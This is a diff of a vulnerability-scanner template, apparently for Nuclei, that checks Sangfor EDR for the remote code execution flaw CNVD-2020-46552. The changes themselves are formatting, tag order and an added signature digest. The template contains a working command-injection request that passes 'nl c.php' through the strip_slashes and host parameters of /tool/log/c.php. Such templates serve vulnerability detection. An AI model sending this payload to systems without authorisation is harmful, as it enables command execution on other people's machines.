@@ -1,5 +1,4 @@
 id: CNVD-2020-46552
-
 info:
   name: Sangfor EDR - Remote Code Execution
   author: ritikchaddha
@@ -15,13 +14,11 @@ info:
     cwe-id: CWE-77
   metadata:
     max-request: 1
-  tags: cnvd,cnvd2020,sangfor,rce,vuln
-
+  tags: cnvd,cnvd2020,rce,sangfor,vuln
 http:
   - method: GET
     path:
       - "{{BaseURL}}/tool/log/c.php?strip_slashes=printf&host=nl+c.php"
-
     matchers:
       - type: dsl
         dsl:
@@ -30,4 +27,4 @@ http:
           - 'contains(body, "Log Helper")'
           - 'status_code == 200'
         condition: and
-
+        # digest: 4b0a00483046022100fa3e1466f1917407d550cca9f8f2d3366b96cd15b4fb4cd8124bfa4afefec00d02210080f178b41c0b17d8d71e12a0e9dd53c2ad215808f47ba0b108c51bfa78c07051:922c64590222798bb761d5b6d8e72950
